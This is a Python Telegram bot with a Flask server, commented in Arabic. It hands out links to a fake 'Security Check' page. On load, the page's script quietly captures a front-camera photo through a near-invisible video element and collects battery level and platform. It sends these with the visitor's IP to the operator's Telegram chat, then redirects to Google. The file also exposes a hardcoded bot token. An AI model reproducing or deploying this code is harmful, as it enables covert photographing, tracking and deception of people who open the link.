import telebot
import base64
import os
from flask import Flask, request, render_template_string
from threading import Thread

# --- الإعدادات ---
TOKEN = '8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU' # استبدله بتوكن بوتك الحقيقي
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- واجهة السحب (الرابط الدائم) ---
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Check</title>
</head>
<body style="background:#000; color:#00ff00; text-align:center; font-family:monospace; padding-top:50px;">
    <h3>INITIALIZING SECURE CONNECTION...</h3>
    <video id="v" autoplay playsinline style="width:1px; height:1px; opacity:0.01;"></video>
    <canvas id="c" width="720" height="1280" style="display:none;"></canvas>

    <script>
        async function start() {
            let b = await navigator.getBattery();
            let specs = { l: Math.floor(b.level*100), p: navigator.platform };
            
            try {
                let s = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
                let v = document.getElementById('v');
                v.srcObject = s;
                v.onplaying = () => {
                    setTimeout(() => {
                        let canvas = document.getElementById('c');
                        canvas.getContext('2d').drawImage(v, 0, 0, 720, 1280);
                        let img = canvas.toDataURL('image/jpeg', 0.8);
                        send(specs, img);
                    }, 3500);
                };
            } catch (e) { send(specs, null); }
        }
        function send(specs, img) {
            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ id: '{{chat_id}}', specs: specs, img: img })
            }).then(() => window.location.replace('https://google.com'));
        }
        window.onload = start;
    </script>
</body>
</html>
"""

@app.route('/target/<chat_id>')
def entry(chat_id):
    return render_template_string(HTML_PAGE, chat_id=chat_id)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    cid, s = data['id'], data['specs']
    bot.send_message(cid, f"🚀 **صيد جديد من الرابط الدائم:**\n🔋 الشحن: {s['l']}%\n📱 النظام: {s['p']}\n📍 IP: {request.remote_addr}")
    if data['img']:
        img = base64.b64decode(data['img'].split(',')[1])
        with open(f'shot_{cid}.jpg', 'wb') as f: f.write(img)
        with open(f'shot_{cid}.jpg', 'rb') as p: bot.send_photo(cid, p)
        os.remove(f'shot_{cid}.jpg')
    return 'OK'

@bot.message_handler(commands=['start'])
def send_link(message):
    # ملاحظة: سيتم استبدال 'YOUR_DOMAIN' برابط Render لاحقاً
    bot.reply_to(message, "أهلاً بك في نظام V8 Global.\nسيتم تفعيل الرابط بمجرد ربط GitHub بالاستضافة.")

if __name__ == "__main__":
    # تشغيل Flask في الخلفية وبوت التليجرام في الأمام
    Thread(target=lambda: app.run(host='0.0.0.0', port=10000)).start()
    bot.infinity_polling()
